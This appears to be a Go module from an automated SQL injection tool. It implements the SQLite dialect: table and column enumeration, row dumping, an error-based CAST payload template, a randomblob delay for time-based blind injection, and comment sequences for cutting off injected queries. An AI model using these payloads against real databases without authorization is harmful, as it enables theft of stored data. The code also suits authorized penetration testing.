package dbms

import (
	"fmt"
	"strings"
)

// SQLite implements DBMS for SQLite.
// Key SQLite SQL differences:
//   - String concatenation uses ||
//   - substr() (lower-case, not SUBSTRING)
//   - length() for string length
//   - No SLEEP(); uses randomblob() heavy query for delay approximation
//   - LIMIT/OFFSET supported natively
//   - No multi-database schema: uses sqlite_master for table enumeration
//   - Error-based via type coercion (CAST with hex())
type SQLite struct{}

func (s *SQLite) Name() string { return "SQLite" }

func (s *SQLite) Concatenate(parts ...string) string {
	return strings.Join(parts, "||")
}

func (s *SQLite) Substring(expr string, start, length int) string {
	return fmt.Sprintf("substr(%s,%d,%d)", expr, start, length)
}

func (s *SQLite) Length(expr string) string {
	return fmt.Sprintf("length(%s)", expr)
}

func (s *SQLite) ASCII(expr string) string {
	return fmt.Sprintf("unicode(%s)", expr)
}

func (s *SQLite) Char(code int) string {
	return fmt.Sprintf("char(%d)", code)
}

func (s *SQLite) VersionQuery() string {
	return "sqlite_version()"
}

func (s *SQLite) CurrentUserQuery() string {
	// SQLite has no user concept
	return "'sqlite'"
}

func (s *SQLite) CurrentDBQuery() string {
	// SQLite database name is the file name; return a constant for compatibility
	return "sqlite_version()"
}

func (s *SQLite) HostnameQuery() string {
	return "'localhost'"
}

func (s *SQLite) ListDatabasesQuery() string {
	// SQLite uses ATTACH for multiple databases; main is always "main"
	return "SELECT name FROM pragma_database_list"
}

func (s *SQLite) ListTablesQuery(_ string) string {
	// SQLite: list all user tables from sqlite_master
	return "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"
}

func (s *SQLite) ListColumnsQuery(_, table string) string {
	return fmt.Sprintf("SELECT name FROM pragma_table_info('%s')", table)
}

func (s *SQLite) CountRowsQuery(_, table string) string {
	return fmt.Sprintf("SELECT COUNT(*) FROM %s", table)
}

func (s *SQLite) DumpQuery(_ string, table string, columns []string, offset, limit int) string {
	cols := strings.Join(columns, ",")
	return fmt.Sprintf("SELECT %s FROM %s LIMIT %d OFFSET %d", cols, table, limit, offset)
}

func (s *SQLite) ErrorPayloads() []PayloadTemplate {
	// SQLite does not produce rich error messages by default; error-based
	// injection is limited. The most reliable method is boolean-blind or UNION.
	return []PayloadTemplate{
		{
			Name:     "cast",
			Template: "CAST(({{.Query}}) AS integer)",
			DBMS:     "SQLite",
		},
	}
}

// SleepFunction returns a SQLite heavy query that approximates a delay.
// SQLite has no SLEEP() function; randomblob() with a large argument forces
// CPU work that approximates a delay (accuracy is environment-dependent).
func (s *SQLite) SleepFunction(seconds int) string {
	// Each iteration of the heavy query approximates ~1 second of CPU work.
	// This is highly dependent on hardware; treat as a best-effort approximation.
	return fmt.Sprintf(
		"(SELECT COUNT(*) FROM (SELECT randomblob(1000000000/%d) FROM sqlite_master))",
		max(seconds, 1),
	)
}

func (s *SQLite) HeavyQuery() string {
	return "SELECT COUNT(*) FROM (SELECT randomblob(1000000) FROM sqlite_master)"
}

func (s *SQLite) IfThenElse(condition, trueExpr, falseExpr string) string {
	return fmt.Sprintf("CASE WHEN %s THEN %s ELSE %s END", condition, trueExpr, falseExpr)
}

func (s *SQLite) QuoteString(str string) string {
	return "'" + strings.ReplaceAll(str, "'", "''") + "'"
}

func (s *SQLite) CommentSequence() string {
	return "-- "
}

func (s *SQLite) InlineComment() string {
	return "/**/"
}

func (s *SQLite) FileReadQuery(path string) string {
	// SQLite has no built-in file read function
	return fmt.Sprintf("-- SQLite does not support file read (path: %s)", path)
}

func (s *SQLite) Capabilities() Capabilities {
	return Capabilities{
		StackedQueries: false, // SQLite does not support stacked queries via semicolon injection
		ErrorBased:     false, // SQLite error messages are not informative enough
		UnionBased:     true,
		FileRead:       false,
		FileWrite:      false,
		OSCommand:      false,
		OutOfBand:      false,
		Subqueries:     true,
		CaseWhen:       true,
		LimitOffset:    true,
	}
}

// max returns the larger of a and b (compatibility helper).
func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
